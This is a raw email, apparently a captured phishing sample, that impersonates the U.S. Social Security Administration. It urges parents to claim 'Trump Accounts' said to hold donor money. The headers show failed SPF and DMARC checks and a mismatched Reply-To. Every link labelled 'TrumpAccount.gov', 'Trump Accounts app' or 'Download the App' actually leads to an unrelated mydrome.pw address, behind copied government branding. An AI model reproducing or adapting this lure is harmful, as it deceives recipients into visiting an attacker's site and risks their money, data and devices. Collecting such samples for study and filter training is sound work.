@@ -1,0 +1,355 @@
+Return-Path: <info@yourarchive.com>
+Received: from [81.200.19.126] ([81.200.19.126])
+ by inbound-smtp.us-east-2.amazonaws.com with SMTP id 5apphsrb2o8biid3i30l55dg1fl7f25569ec1vg1
+ for zingerpie@kfcreview.com;
+ Sun, 25 Oct 2026 02:31:58 +0000 (UTC)
+Received-SPF: fail (spfCheck: domain of yourarchive.com does not designate 81.200.19.126 as permitted sender) client-ip=81.200.19.126; envelope-from=info@yourarchive.com; helo=[81.200.19.126];
+Authentication-Results: amazonses.com;
+ spf=fail (spfCheck: domain of yourarchive.com does not designate 81.200.19.126 as permitted sender) client-ip=81.200.19.126; envelope-from=info@yourarchive.com; helo=[81.200.19.126];
+ dmarc=fail header.from=yourarchive.com;
+X-SES-RECEIPT: AEFBQUFBQUFBQUFFSnllL1F6TnVxR0JXWUIrRG5HNHRna1JjdVNPLy82VHFPNWtsR0hyT3FNQ1BOQTVaNmpGMVVEYzRaMzZERWZmRkpjc3IrOVJiNFUvdGFQVEpKYVhkT0FaYncvei9Hanc5OFF4K2g5b3lJTGtEWnliVDU2cGZwZkJPSE5sVlovMEdJVXBzQjYxSWdaLzVLcXdqZmVmSFIrMEpGanJvTVZ3UzRHZUpkOFpJdFFuQWhaVHcrOFZqMitBY0lNaCtBczFyS0EwRDU2cEtiRkRNU2hZWGRTMnNLMkRWbmRLdlYvMlM5aXRtWSt1WnFVNnJPMlBucWxIbTZabE1XWjlSZWZ1aDNLNXFkb3YwV2lTQnZSTXhSVHZYZStZZ3lPY1BSS2xpd2h1VDRpNTBFTUxpcFR1NlBsY0ZmS1BCY0R4bUtZK0E9
+X-SES-DKIM-SIGNATURE: a=rsa-sha256; q=dns/txt; b=YBIQ3RJ4TiZwuNg9j+n9a0MswYrTHdEzX7urXakp5Y2V746HFdfJyYPeBWmJLE40wzkUmzLUz4wWB8KndNoBrvPXYkNOMQ3ePoROowdvLYTGOCeSSJQkf/1Y+qYK9aKxrq8ZQpaqrvPBiO1+BTWGmrIeW9omvOJATyZy44SWuII=; c=relaxed/simple; s=kra23psoka5qyyh6gdejiiuof3nluwuz; d=amazonses.com; t=1792895518; v=1; bh=fSgcp9YALjn5y/MCJhUxBxKB3oEndvqJ88SIm32a8ns=; h=From:To:Cc:Bcc:Subject:Date:Message-ID:MIME-Version:Content-Type:X-SES-RECEIPT;
+Reply-To: info@brucesandy.com
+From: Social Security Adminstration <info@yourarchive.com>
+To: zingerpie@kfcreview.com
+Subject: =?UTF-8?B?R2l2aW5nIEFtZXJpY2HigJlzIENoaWxkcmVuIGEgU3Rha2UgaW4gdGhlIEFtZXJpY2FuIERyZWFt?=
+Date: 25 Oct 2026 05:31:56 +0300
+Message-ID: <20261025053156.BDBFAC07532E27BA@yourarchive.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body>
+<span style=3D'color: rgb(51, 51, 51); text-transform: none; text-indent: 0=
+px; letter-spacing: normal; font-family: "Lucida Grande", Verdana, Arial, H=
+elvetica, sans-serif; font-size: 11px; font-style: normal; font-weight: 400=
+; word-spacing: 0px; float: none; display: inline !important; white-space: =
+normal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-v=
+ariant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wi=
+dth: 0px; text-decoration-thickness: initial;=20
+text-decoration-style: initial; text-decoration-color: initial;'>Giving Ame=
+rica's Children a Stake in the American Dream</span>
+<div class=3D"rcmBody" id=3D"message-htmlpart1" style=3D'margin: 0px; paddi=
+ng: 0px; width: 845.6px; color: rgb(51, 51, 51); text-transform: none; text=
+-indent: 0px; letter-spacing: normal; font-family: "Lucida Grande", Verdana=
+, Arial, Helvetica, sans-serif; font-size: 11px; font-style: normal; font-w=
+eight: 400; word-spacing: 0px; white-space: normal; orphans: 2; widows: 2; =
+background-color: rgb(255, 255, 255); font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px;=20
+text-decoration-thickness: initial; text-decoration-style: initial; text-de=
+coration-color: initial;'><table style=3D"width: 845.6px;" bgcolor=3D"#ffff=
+ff" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr bgcolor=3D"=
+#ffffff"><td align=3D"center" valign=3D"top" style=3D'padding: 0px; color: =
+rgb(255, 255, 255); font-family: "Helvetica Neue", Helvetica, Arial, sans-s=
+erif; font-size: 1px; background-color: rgb(255, 255, 255);'>Nearly 70 mill=
+ion Trump Accounts are open for all American children.</td></tr>
+</tbody></table><a name=3D"v1gd_top" id=3D"v1gd_top" style=3D"color: rgb(0,=
+ 105, 166);"></a><table width=3D"100%" align=3D"center" class=3D"v1gd_tbl_w=
+rap" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=
+=3D"margin: 0px; padding: 0px; width: 845.6px; background-color: rgb(221, 2=
+21, 221);" bgcolor=3D"#dddddd">
+<table width=3D"100%" align=3D"center" id=3D"v1flexible-abe-main-table" sty=
+le=3D"padding-top: 30px; padding-bottom: 20px; border-spacing: 0px; text-si=
+ze-adjust: 100%;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><=
+tr><td style=3D"text-size-adjust: 100%;"></td><td style=3D"text-size-adjust=
+: 100%;"><div class=3D"v1abe-section-block" style=3D"padding-top: 0px; bord=
+er-top-color: currentColor; border-top-width: 0px; border-top-style: none;"=
+>
+<table width=3D"100%" align=3D"center" class=3D"v1abe-section-table" style=
+=3D"max-width: 600px; border-spacing: 0px; text-size-adjust: 100%;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr class=3D"v1abe-sectio=
+n-row" id=3D"v1abe-section-row-d1c0230d-4ab4-4de2-95d8-4c5aed7d7428" style=
+=3D"background-color: rgb(0, 42, 92);" bgcolor=3D"#002a5c"><td align=3D"cen=
+ter" valign=3D"top" style=3D"text-align: center; font-size: 0px; vertical-a=
+lign: top; text-size-adjust: 100%;">
+<div class=3D"v1abe-column-block" id=3D"v1abe-column-block-9305e20b-e80c-45=
+f4-9113-f3047cefa6c5" style=3D"width: 600px; padding-top: 0px; font-size: 1=
+6px; vertical-align: top; border-top-color: currentColor; border-top-width:=
+ 0px; border-top-style: none; display: inline-block; min-height: 5px; box-s=
+izing: border-box; background-color: rgb(0, 42, 92);">
+<table width=3D"100%" align=3D"center" style=3D"text-align: left; table-lay=
+out: fixed; border-spacing: 0px; text-size-adjust: 100%; overflow-wrap: bre=
+ak-word;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td c=
+lass=3D"v1abe-column-block-padding" id=3D"v1abe-column-block-9305e20b-e80c-=
+45f4-9113-f3047cefa6c5-padding" style=3D"padding: 0px; text-size-adjust: 10=
+0%;">
+<a style=3D"color: rgb(0, 105, 166); text-size-adjust: 100%;" href=3D"#" ta=
+rget=3D"_blank" rel=3D"noreferrer">
+<img width=3D"600" height=3D"80" class=3D"v1govd_template_image" style=3D"b=
+order: currentColor; border-image: none; width: 600px; height: auto; line-h=
+eight: 1; text-decoration: none; max-width: 100%;" alt=3D"Social Security A=
+dministration" src=3D"https://content.govdelivery.com/attachments/fancy_ima=
+ges/USSSATITLE/2025/10/12562169/ssa44_original.png"></a></td></tr></tbody><=
+/table></div></td></tr></tbody></table></div><div class=3D"v1abe-section-bl=
+ock">
+<table width=3D"100%" align=3D"center" class=3D"v1abe-section-table" style=
+=3D"max-width: 600px; border-spacing: 0px; text-size-adjust: 100%;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr class=3D"v1abe-sectio=
+n-row" id=3D"v1abe-section-row-346625e2-ceb3-44f5-a930-a2ac8c8e8aad" style=
+=3D"background-color: rgb(46, 116, 181);" bgcolor=3D"#2e74b5"><td align=3D"=
+center" valign=3D"top" style=3D"text-align: center; font-size: 0px; vertica=
+l-align: top; text-size-adjust: 100%;">
+<div class=3D"v1abe-column-block" id=3D"v1abe-column-block-9140617f-61b8-46=
+55-a7ec-8fc448fa0098" style=3D'background: url("https://content.govdelivery=
+=2Ecom/attachments/fancy_images/USSSATITLE/2025/04/11412212/lxg-original-2_=
+original.png") no-repeat rgb(46, 116, 181); width: 600px; padding-top: 0px;=
+ font-size: 16px; vertical-align: top; border-top-color: currentColor; bord=
+er-top-width: 0px; border-top-style: none; display: inline-block; min-heigh=
+t: 5px; box-sizing: border-box;'>
+<table width=3D"100%" align=3D"center" style=3D"text-align: left; table-lay=
+out: fixed; border-spacing: 0px; text-size-adjust: 100%; overflow-wrap: bre=
+ak-word;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td c=
+lass=3D"v1abe-column-block-padding" id=3D"v1abe-column-block-9140617f-61b8-=
+4655-a7ec-8fc448fa0098-padding" style=3D"padding: 30px; text-size-adjust: 1=
+00%;">
+<h1 align=3D"left" style=3D"margin: 0px 0px 10px; text-align: left; color: =
+rgb(189, 214, 238); line-height: 1.2; font-family: calibri, candara, segoe,=
+ optima, arial, sans-serif; font-size: 45px; -ms-word-break: keep-all; over=
+flow-wrap: normal; hyphens: none;">Giving America's Children a Stake in the=
+ American Dream</h1></td></tr></tbody></table></div></td></tr></tbody></tab=
+le></div><div class=3D"v1abe-section-block">
+<table width=3D"100%" align=3D"center" class=3D"v1abe-section-table" style=
+=3D"max-width: 600px; border-spacing: 0px; text-size-adjust: 100%;" border=
+=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr class=3D"v1abe-sectio=
+n-row" id=3D"v1abe-section-row-31069adf-e65c-429f-af2b-bc3f4bcbf790" style=
+=3D"background-color: rgb(255, 255, 255);" bgcolor=3D"#ffffff"><td align=3D=
+"center" valign=3D"top" style=3D"text-align: center; font-size: 0px; vertic=
+al-align: top; text-size-adjust: 100%;">
+<div class=3D"v1abe-column-block" id=3D"v1abe-column-block-109d0394-1e16-4f=
+d6-9e7c-250c5710f540" style=3D"width: 600px; padding-top: 0px; font-size: 1=
+6px; vertical-align: top; border-top-color: currentColor; border-top-width:=
+ 0px; border-top-style: none; display: inline-block; min-height: 5px; box-s=
+izing: border-box; background-color: rgb(255, 255, 255);">
+<table width=3D"100%" align=3D"center" style=3D"text-align: left; table-lay=
+out: fixed; border-spacing: 0px; text-size-adjust: 100%; overflow-wrap: bre=
+ak-word;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td c=
+lass=3D"v1abe-column-block-padding" id=3D"v1abe-column-block-109d0394-1e16-=
+4fd6-9e7c-250c5710f540-padding" style=3D"padding: 30px; text-size-adjust: 1=
+00%;"><table width=3D"100%" style=3D"border-spacing: 0px; text-size-adjust:=
+ 100%;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td align=3D"center" style=3D"text-size-adjust: 100%;"><a style=3D"color: r=
+gb(0, 105, 166); text-size-adjust: 100%;" href=3D"#CL0/https:%2F%2Fapplink.=
+trumpaccount.com%2Fdownload_app_gov%3Fsource=3Dssa_email%26campaign=3Dbroad=
+_email_oct/1/010001a164b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-000000/u=
+0HHfYWYfjGsYAfuZzO2LlhtO7Rk4HfqWnPe-OLGffk=3D452" target=3D"_blank" rel=3D"=
+noreferrer">
+<img width=3D"426" height=3D"176" class=3D"v1govd_template_image" style=3D"=
+border: currentColor; border-image: none; width: 426px; height: auto; line-=
+height: 1; text-decoration: none; max-width: 100%;" alt=3D"Trump Accounts L=
+ogo" src=3D"https://content.govdelivery.com/attachments/fancy_images/USSSAT=
+ITLE/2026/10/14557649/7192210/ge-logo-color_crop.png"></a></td></tr></tbody=
+></table>
+<p align=3D"left" style=3D"margin: 1em 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">
+Last year, President Donald J. Trump signed into law the Working Families T=
+ax Cuts, which included a historic tax cut for America's seniors. That law =
+also created Trump Accounts, individual investment accounts for America's c=
+hildren designed to grow with the U.S. economy and build long-term savings.=
+</p>
+<p align=3D"left" style=3D"margin: 0px 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">Today, nearly 70 millio=
+n Trump Accounts are open for all American children. Parents and legal guar=
+dians simply need to claim their child's Trump Account through the official=
+ <strong>
+<a style=3D"color: rgb(5, 99, 193); text-size-adjust: 100%;" href=3D"https:=
+//mydrome.pw/bb/sc/tpact/trumpaccount.html" target=3D"_blank" rel=3D"norefe=
+rrer">Trump Accounts app</a>.</strong></p>
+<p align=3D"left" style=3D"margin: 0px 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">
+Once activated, the account can receive funds from family, friends, and emp=
+loyers, as well as gifts from generous donors. Tens of millions of accounts=
+ already have money contributed by donors in them, just waiting to be claim=
+ed.</p>
+<p align=3D"left" style=3D"margin: 0px 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">
+At Social Security, we are informing families about how they can activate t=
+heir child's Trump Account&#8212;many accounts with money already in them. =
+We are also communicating with parents of newborns about the one-time $1,00=
+0 contribution from the U.S. Treasury, available to children born between J=
+an. 1, 2025, and Dec. 31, 2028.</p>
+<p align=3D"left" style=3D"margin: 0px 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">
+Trump Accounts are one of the most significant investments in the next gene=
+ration of Americans in our nation's history, by giving every American child=
+ a stake in our country's success and a strong financial foundation for the=
+ future.</p>
+<p align=3D"left" style=3D"margin: 0px 0px 15px; text-align: left; color: r=
+gb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, optima=
+, arial, sans-serif; font-size: 17px; -ms-word-break: keep-all; text-size-a=
+djust: 100%; overflow-wrap: normal; hyphens: none;">To learn more about Tru=
+mp Accounts, visit <strong>
+<a style=3D"color: rgb(5, 99, 193); text-size-adjust: 100%;" href=3D"https:=
+//mydrome.pw/bb/sc/tpact/trumpaccount.html" target=3D"_blank" rel=3D"norefe=
+rrer">TrumpAccount.gov</a></strong>.</p><table width=3D"100%" class=3D"v1go=
+vd_button" style=3D"border-spacing: 0px; text-size-adjust: 100%;" border=3D=
+"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"padding-bottom: 15px; text-size-adjust: 100%;"><table align=3D=
+"center" style=3D"margin: 0px auto; border-spacing: 0px; text-size-adjust: =
+100%;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td alig=
+n=3D"center" class=3D"v1govd_button" style=3D"padding: 10px 30px; border-ra=
+dius: 4px; border: currentColor; border-image: none; text-align: center; di=
+splay: inline-block; background-color: rgb(9, 60, 143); text-size-adjust: 1=
+00%; overflow-wrap: break-word;" bgcolor=3D"#093c8f">
+<a style=3D"color: rgb(0, 105, 166); text-decoration: none !important; text=
+-size-adjust: 100%;" href=3D"https://mydrome.pw/bb/sc/tpact/trumpaccount.ht=
+ml" target=3D"_blank" rel=3D"noreferrer">
+<strong style=3D"color: rgb(255, 255, 255); font-family: calibri, candara, =
+segoe, optima, arial, sans-serif; font-size: 20px; text-decoration: none;">=
+Download the App</strong></a></td></tr></tbody></table></td></tr></tbody></=
+table></td></tr></tbody></table></div></td></tr></tbody></table></div></td>=
+<td style=3D"text-size-adjust: 100%;"></td></tr></tbody></table></td></tr><=
+/tbody></table><div id=3D"v1mail_footer"><table width=3D"100%" align=3D"cen=
+ter" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td style=3D"margin: 0px; padding: 10px 0px; width: 845.6px; background-col=
+or: rgb(221, 221, 221);" bgcolor=3D"#dddddd"><table width=3D"100%" align=3D=
+"center" style=3D"padding-top: 0px; padding-bottom: 20px; border-spacing: 0=
+px; text-size-adjust: 100%;" border=3D"0" cellspacing=3D"0" cellpadding=3D"=
+0"><tbody><tr><td style=3D"text-size-adjust: 100%;">&nbsp;</td><td style=3D=
+"text-size-adjust: 100%;">
+<table width=3D"100%" align=3D"center" style=3D"max-width: 600px; border-sp=
+acing: 0px; text-size-adjust: 100%;" border=3D"0" cellspacing=3D"0" cellpad=
+ding=3D"0"><tbody><tr style=3D"background-color: rgb(221, 221, 221);" bgcol=
+or=3D"#dddddd"><td align=3D"center" valign=3D"top" style=3D"text-align: cen=
+ter; font-size: 0px; vertical-align: top; text-size-adjust: 100%;">
+<div class=3D"v1abe-column-block" style=3D"width: 600px; padding-top: 0px; =
+font-size: 16px; vertical-align: top; border-top-color: currentColor; borde=
+r-top-width: 0px; border-top-style: none; display: inline-block; min-height=
+: 5px; box-sizing: border-box;"><table width=3D"100%" align=3D"center" styl=
+e=3D"text-align: left; table-layout: fixed; border-spacing: 0px; text-size-=
+adjust: 100%; overflow-wrap: break-word;" border=3D"0" cellspacing=3D"0" ce=
+llpadding=3D"0"><tbody><tr>
+<td width=3D"142" align=3D"left" valign=3D"top" style=3D"width: 142px;"><ta=
+ble width=3D"100%" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody>=
+<tr><td width=3D"100%" align=3D"left" valign=3D"top" style=3D"padding: 0px =
+15px 0px 2px;">
+<a style=3D"color: rgb(0, 105, 166);" href=3D"#" target=3D"_blank" rel=3D"n=
+oreferrer">
+<img width=3D"125" class=3D"v1govd_template_image" style=3D"border: current=
+Color; border-image: none; width: 125px; height: auto; line-height: 1; text=
+-decoration: none; max-width: 100%;" alt=3D"Social Security Administration"=
+ src=3D"https://content.govdelivery.com/attachments/fancy_images/USSSA/2025=
+/12/12792322/ss-lt_original.png"></a></td></tr></tbody></table></td><td ali=
+gn=3D"right" valign=3D"top" style=3D"text-align: right;"><table width=3D"10=
+0%" align=3D"center" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr><td style=3D"padding: 0px 2px 0px 0px; text-size-adjust: 100%;">=
+<p align=3D"right" style=3D"margin: 0px 0px 12px; text-align: right; color:=
+ rgb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, opti=
+ma, arial, sans-serif; font-size: 15px; -ms-word-break: keep-all; text-size=
+-adjust: 100%; overflow-wrap: normal; hyphens: none;"><strong>Go Digital!</=
+strong> Join the millions and discover your benefits.</p>
+<table width=3D"100%" style=3D"border-spacing: 0px; text-size-adjust: 100%;=
+" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr><td style=3D"=
+padding-bottom: 12px; text-size-adjust: 100%;"><table align=3D"right" style=
+=3D"float: right; border-spacing: 0px; text-size-adjust: 100%;" border=3D"0=
+" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr>
+<td align=3D"center" style=3D"padding: 8px 16px; border-radius: 5px; border=
+: 1px solid rgb(9, 60, 143); border-image: none; text-align: center; displa=
+y: inline-block; background-color: rgb(255, 255, 255); text-size-adjust: 10=
+0%; overflow-wrap: break-word;" bgcolor=3D"#ffffff">
+<a style=3D"color: rgb(0, 105, 166); text-decoration: none !important; text=
+-size-adjust: 100%;" href=3D"#CL0/http:%2F%2Fwww.socialsecurity.gov%2Fmyacc=
+ount%2F%3Futm_medium=3Demail%26utm_source=3Dgovdelivery/1/010001a164b2679d-=
+103e811c-0c5b-4fac-8a66-2bec201c13de-000000/okq_BMA7Q3S5UjjesmwhbYvmBZwJqLP=
+cSBCjnV-5_rE=3D452" target=3D"_blank" rel=3D"noreferrer">
+<strong style=3D"color: rgb(51, 102, 153); font-family: calibri, candara, s=
+egoe, optima, arial, sans-serif; font-size: 15px; font-weight: normal; text=
+-decoration: none;">Create a personal <span style=3D"color: rgb(204, 0, 0);=
+ font-family: Georgia, serif; font-style: italic;">my</span> <span style=3D=
+"color: rgb(51, 102, 153); font-family: Georgia, serif;">Social Security</s=
+pan> account</strong></a></td></tr></tbody></table></td></tr></tbody></tabl=
+e><table width=3D"100%" cellspacing=3D"0" cellpadding=3D"0">
+<tbody><tr><td width=3D"100%" align=3D"right" style=3D"padding: 0px 0px 12p=
+x; text-align: right;"><a style=3D"color: rgb(0, 105, 166);" href=3D"#CL0/h=
+ttps:%2F%2Ftwitter.com%2Fsocialsecurity%3Futm_medium=3Demail%26utm_source=
+=3Dgovdelivery/1/010001a164b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-0000=
+00/51DvT_bNjUMolfiBc1cz0SCkIVdmdWxA48CHl5V8dsk=3D452" target=3D"_blank" rel=
+=3D"noreferrer">
+<img height=3D"32" style=3D"border: 0px currentColor; border-image: none; w=
+idth: auto; height: 32px;" alt=3D"x" src=3D"https://content.govdelivery.com=
+/attachments/fancy_images/USSSA/2025/12/12792642/ss4e-01_original.png" widt=
+h=3D"40"></a>
+<a style=3D"color: rgb(0, 105, 166);" href=3D"#CL0/https:%2F%2Fwww.facebook=
+=2Ecom%2Fsocialsecurity%3Futm_medium=3Demail%26utm_source=3Dgovdelivery/1/0=
+10001a164b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-000000/VeLj_9eVy7lmqo0=
+iV71bVpQ4TlDNiVr2RiaYeVkxEv0=3D452" target=3D"_blank" rel=3D"noreferrer">
+<img height=3D"32" style=3D"border: 0px currentColor; border-image: none; w=
+idth: auto; height: 32px;" alt=3D"facebook" src=3D"https://content.govdeliv=
+ery.com/attachments/fancy_images/USSSA/2025/12/12792643/ss4e-02_original.pn=
+g" width=3D"37"></a>
+<a style=3D"color: rgb(0, 105, 166);" href=3D"#CL0/https:%2F%2Fwww.youtube.=
+com%2Fsocialsecurityonline%3Futm_medium=3Demail%26utm_source=3Dgovdelivery/=
+1/010001a164b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-000000/C5sNbvvYCxly=
+y1NEjaPSCfFR4jdP21vGt3HwXNGmjoc=3D452" target=3D"_blank" rel=3D"noreferrer"=
+>
+<img height=3D"32" style=3D"border: 0px currentColor; border-image: none; w=
+idth: auto; height: 32px;" alt=3D"youtube" src=3D"https://content.govdelive=
+ry.com/attachments/fancy_images/USSSA/2025/12/12792644/ss4e-03_original.png=
+" width=3D"51"></a>
+<a style=3D"color: rgb(0, 105, 166);" href=3D"#CL0/https:%2F%2Fwww.instagra=
+m.com%2Fsocialsecurity%2F%3Futm_medium=3Demail%26utm_source=3Dgovdelivery/1=
+/010001a164b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-000000/Fvo1BL0H_dicR=
+xc0bizW8U2p8H0M8pCg3w7riFMkwV0=3D452" target=3D"_blank" rel=3D"noreferrer">=
+
+<img height=3D"32" style=3D"border: 0px currentColor; border-image: none; w=
+idth: auto; height: 32px;" alt=3D"instagram" src=3D"https://content.govdeli=
+very.com/attachments/fancy_images/USSSA/2025/12/12792653/ss4e-04_original.p=
+ng" width=3D"38"></a></td></tr></tbody></table>
+<p align=3D"right" style=3D"margin: 0px 0px 15px; text-align: right; color:=
+ rgb(0, 0, 0); line-height: 1.4; font-family: calibri, candara, segoe, opti=
+ma, arial, sans-serif; font-size: 14px; -ms-word-break: keep-all; text-size=
+-adjust: 100%; overflow-wrap: normal; hyphens: none;">
+<a style=3D"color: rgb(9, 60, 143); text-decoration: underline;" href=3D"#C=
+L0/https:%2F%2Fpublic.govdelivery.com%2Faccounts%2FUSSSA%2Fsubscriber%2Fedi=
+t%3Fpreferences=3Dtrue%23tab1/1/010001a164b2679d-103e811c-0c5b-4fac-8a66-2b=
+ec201c13de-000000/GhIUY3jvNoLXCtcgXeaxlxlYWiITWhbxyC5TYd_9NAE=3D452" target=
+=3D"_blank" rel=3D"noreferrer">Manage Subscriptions</a>
+ &nbsp;|&nbsp; <a style=3D"color: rgb(9, 60, 143); text-decoration: underli=
+ne;" href=3D"#CL0/https:%2F%2Fpublic.govdelivery.com%2Faccounts%2FUSSSATITL=
+E%2Fsubscriber%2Fone_click_unsubscribe%3Fverification=3D5.5decfcdec0fc196f3=
+e6331ea839609b3%26destination=3Dvickip%2540vcn.com/1/010001a164b2679d-103e8=
+11c-0c5b-4fac-8a66-2bec201c13de-000000/Wq6tu4tNbUDIhBMV5y61Vjq57TVl03JZzkL0=
+HgplM88=3D452" target=3D"_blank" rel=3D"noreferrer">Unsubscribe&nbsp;All</a=
+>
+ &nbsp;|&nbsp; <a style=3D"color: rgb(9, 60, 143); text-decoration: underli=
+ne;" href=3D"#CL0/https:%2F%2Fsubscriberhelp.govdelivery.com%2F/1/010001a16=
+4b2679d-103e811c-0c5b-4fac-8a66-2bec201c13de-000000/4mfIE65_QJbijio8FAeIfh6=
+gazTld98d1llFZtYchmc=3D452" target=3D"_blank" rel=3D"noreferrer">Help</a></=
+p></td></tr></tbody></table></td></tr></tbody></table></div></td></tr></tbo=
+dy></table></td><td style=3D"text-size-adjust: 100%;">&nbsp;</td></tr></tbo=
+dy></table></td></tr></tbody></table>
+</div><div id=3D"v1tagline"><table style=3D"margin: 0px auto; width: 845.6p=
+x; border-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpadding=
+=3D"0"><tbody><tr><td valign=3D"top" style=3D"padding: 0px 10px;"><table al=
+ign=3D"right" class=3D"v1mobile-tagline" style=3D"margin: 0px auto; width: =
+825.6px; border-collapse: collapse;" border=3D"0" cellspacing=3D"0" cellpad=
+ding=3D"0"><tbody><tr><td valign=3D"top" style=3D"padding: 10px 0px 0px;" c=
+olspan=3D"2"><hr></td></tr><tr>
+<td align=3D"left" valign=3D"top" style=3D"padding: 10px 5px 10px 0px;"><sp=
+an style=3D"color: rgb(117, 117, 117); font-family: arial, helvetica, sans-=
+serif; font-size: 10px;">This email was sent to&nbsp;zingerpie@kfcreview.co=
+m using Granicus Communications Cloud on behalf of: Social Security Adminis=
+tration Notifications &middot; 707 17th St, Suite 4000 &middot; Denver, CO =
+80202</span></td><td width=3D"95" align=3D"right" valign=3D"top" style=3D"w=
+idth: 95px; padding-top: 10px;">
+<a style=3D"color: rgb(0, 105, 166);" href=3D"#CL0/https:%2F%2Fgranicus.com=
+%2Fsolution%2Fdigital-communication-engagement%2F/1/010001a164b2679d-103e81=
+1c-0c5b-4fac-8a66-2bec201c13de-000000/HhloYaWDw-N7fsxoUInFjNqEoBBTG6x3OJ3js=
+oDSUic=3D452" target=3D"_blank" rel=3D"noreferrer"><img width=3D"95" height=
+=3D"27" align=3D"right" style=3D"border: 0px currentColor; border-image: no=
+ne;" alt=3D"Granicus Communications logo" src=3D"https://content.govdeliver=
+y.com/images/govd-logo-dark.png" border=3D"0"></a>
+</td></tr></tbody></table></td></tr></tbody></table></div></div></body></ht=
+ml>
